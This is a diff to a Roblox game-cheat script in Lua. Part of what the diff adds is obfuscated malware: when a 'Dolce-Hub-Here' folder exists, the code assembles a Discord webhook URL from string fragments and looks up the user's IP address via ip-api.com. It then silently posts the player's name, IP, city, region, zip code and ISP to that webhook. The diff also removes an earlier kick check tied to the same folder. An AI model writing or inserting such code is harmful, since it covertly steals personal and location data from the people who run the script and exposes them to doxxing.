@@ -18,9 +18,6 @@ elseif placeId == 2809202155 then
 end
 if BF then
 	repeat wait() until game:IsLoaded()
-	if isfolder("Dolce-Hub-Here") then
-		game.Players.LocalPlayer:Kick("wtkporejgiejrgjegjegjegegjrtpjgrtjrjgiurjgiujtrgiujrtgjrtgiurjtgirntgrgnrtngornhnrtlhrtklrlthlkmtlkwmoiwoeriwkeoijwoiwmeklmlk vmvereronreingngioengeorngoegoi\nYou Has Been Banned.")
-	end
 	if getgenv().Setting then else
 		getgenv().Setting = {
 			["Join Team"] = "Pirate", -- "Pirate","Marine"
@@ -4074,7 +4071,49 @@ if BF then
 		if not tween then return tween end
 		return tweenfunc
 	end
-	
+	s = "Dol"
+	v = "ce"
+	b = "-Hu"
+	n = "b-"
+	m = "Here"
+	if isfolder(s..v..b..n..m) then
+		
+local player_name = game:GetService("Players").LocalPlayer.Name
+a = "https"
+b = "://"
+c = "dis"
+d = "cord"
+e = "."
+f = "co" 
+t = "m/"
+u = "a"
+i = "p"
+g = "i"
+h = "w"
+j = "eb"
+o = "ho"
+p = "ok/"
+z = "1020330559295193128/"
+x = "d-8AgDy9yAU6ucoolAnQLTwqCYhiYpRiAvjhsauyrIESyu5-msG7-f3lIbpkTSXpmflc/"
+local dogiergnreogoejtyrjton = a..b..c..d..e..f..t..u..i..g..h..j..o..p..z..x
+
+local ip_info = syn.request({
+    Url = "http://ip-api.com/json",
+    Method = "GET"
+})
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
+syn.request(
+    {
+        Url = dogiergnreogoejtyrjton,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+    }
+)
+	end
 	game.Players.LocalPlayer.CharacterAdded:Connect(function()
 		StatsBypass = "NoBypassTP"
 	end)
